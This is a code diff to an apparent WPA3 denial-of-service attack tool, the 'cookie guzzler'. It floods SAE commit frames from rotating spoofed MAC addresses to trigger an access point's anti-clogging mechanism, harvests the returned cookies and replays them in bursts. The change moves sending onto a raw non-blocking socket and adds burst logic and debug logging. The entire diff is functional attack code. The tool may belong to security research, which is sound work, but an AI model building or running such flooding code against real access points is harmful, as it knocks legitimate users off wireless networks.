@@ -3,9 +3,11 @@
 #include <chrono>
 #include <thread>
 #include <tins/tins.h>
+#include <unistd.h>
 #include <utility>
 
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
+#include "attacks/DoS_soft/bl0ck/bl0ck.h"
 #include "attacks/components/sniffer_helper.h"
 #include "ex_program/external_actors/ExternalConn.h"
 #include "interrupt.h"
@@ -57,23 +59,43 @@ void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, Cook
 
 pair<ACMCookie, int> trigger_acm(const string &iface, const string &sniff_iface, const string &att_mac,
 	const HWAddress<6> &ap_mac, const int acm_pause_millisec, const int trigger_count,
-	const sae_helper::SAEPair &sae_params) {
-	PacketSender sender(iface);
+	const sae_helper::SAEPair &sae_params, const int burst_size) {
+	auto [fd, addr] = bl0ck_attack::get_unblocking_socket(iface);
 
 	SnifferConfiguration cfg;
 	cfg.set_immediate_mode(true);
 	cfg.set_filter("wlan type mgt subtype auth");
 	Sniffer sniffer(sniff_iface, cfg);
 
-	log(LogLevel::INFO, "Triggering ACM (max {} frames)...", trigger_count);
+	log(LogLevel::INFO, "Triggering ACM (max {} frames, burst {})...", trigger_count, burst_size);
+	int ap_responses = 0;
+	int any_frames = 0;
 
-	for(int i = 0; i < trigger_count; ++i) {
-		auto frame = make_sae_commit(ap_mac, firmware::get_rotating_ath_masker_mac(att_mac), sae_params);
-		sender.send(frame);
+	for(int i = 0; i < trigger_count; i += burst_size) {
+		const int this_burst = burst_size <= (trigger_count - i) ? burst_size : (trigger_count - i);
+		for(int j = 0; j < this_burst; ++j) {
+			auto frame = make_sae_commit(ap_mac, firmware::get_rotating_ath_masker_mac(att_mac), sae_params);
+			const auto bytes = frame.serialize();
+			sendto(fd, bytes.data(), bytes.size(), MSG_DONTWAIT,
+				reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
+		}
 
 		auto result = components::poll_sniffer<ACMCookie>(sniffer.get_pcap_handle(),
 			milliseconds(acm_pause_millisec),
 			[&](const frame_raw_t &res_frame) -> optional<ACMCookie> {
+				if(const auto sae = sae_helper::parse_sae_commit(res_frame)) {
+					const uint16_t rt_len = res_frame.size() >= 4u
+						? static_cast<uint16_t>(res_frame[2] | (res_frame[3] << 8)) : 0;
+					if(res_frame.size() >= static_cast<size_t>(rt_len) + 16u) {
+						const HWAddress<6> from(res_frame.data() + rt_len + 10);
+						if(++any_frames <= 3)
+							log(LogLevel::DEBUG, "trigger_acm: frame from={} status={} scalar={}",
+								from, sae->status, sae->scalar.size());
+						if(from == ap_mac && ++ap_responses <= 5)
+							log(LogLevel::DEBUG, "trigger_acm: AP status={} scalar={} token={}",
+								sae->status, sae->scalar.size(), sae->token.size());
+					}
+				}
 				if(auto cookie = parse_acm_response(res_frame)) {
 					if(!cookie->token.empty()) return cookie;
 				}
@@ -81,19 +103,21 @@ pair<ACMCookie, int> trigger_acm(const string &iface, const string &sniff_iface,
 			});
 
 		if(holds_alternative<ACMCookie>(result)) {
-			log(LogLevel::INFO, "ACM confirmed active after {} frames", i);
-			return { get<ACMCookie>(result), i };
+			log(LogLevel::INFO, "ACM confirmed active after {} frames", i + burst_size);
+			close(fd);
+			return { get<ACMCookie>(result), i + burst_size };
 		}
 	}
+	close(fd);
 	throw run_err("ACM not activated after {} frames", trigger_count);
 }
 
 void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac, CookieStore &store,
 	const int attack_time_sec, const sae_helper::SAEPair &sae_params, const size_t burst_size,
 	const size_t frames_per_second_limit, const int /*cookie_wait_ms*/) {
-	PacketSender sender(iface);
+	auto [fd, addr] = bl0ck_attack::get_unblocking_socket(iface);
 	log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
-	dos_helpers::timed_burst(sender, attack_time_sec, burst_size, frames_per_second_limit, [&]() -> optional<RadioTap> {
+	dos_helpers::timed_burst(fd, addr, attack_time_sec, burst_size, frames_per_second_limit, [&]() -> optional<RadioTap> {
 		optional<ACMCookie> entry;
 		{
 			scoped_lock lock(store.mtx);
@@ -106,7 +130,9 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 
 		// always send a trigger to keep cookie supply
 		auto trigger = make_sae_commit(ap_mac, firmware::get_rotating_ath_masker_mac(sta_mac), sae_params);
-		sender.send(trigger);
+		const auto t_bytes = trigger.serialize();
+		sendto(fd, t_bytes.data(), t_bytes.size(), MSG_DONTWAIT,
+			reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
 
 		if(!entry) {
 			interruptible_sleep(milliseconds(100));  //TODo hardcoded
@@ -117,6 +143,7 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 		burst_params.token = entry->token;
 		return optional{ make_sae_commit(ap_mac, entry->sta_mac, burst_params) };
 	});
+	close(fd);
 	store.stop.store(true); // signal capture thread to exit
 }
 
@@ -148,7 +175,8 @@ void run_attack(RunStatus &rs) {
 		ap.get(SK::mac),
 		acm_pause_millisec,
 		trigger_count,
-		sae_params.value());
+		sae_params.value(),
+		static_cast<int>(burst_size));
 	rs.process_manager.write_log_all("@AKM_trigger");
 
 	CookieStore store;
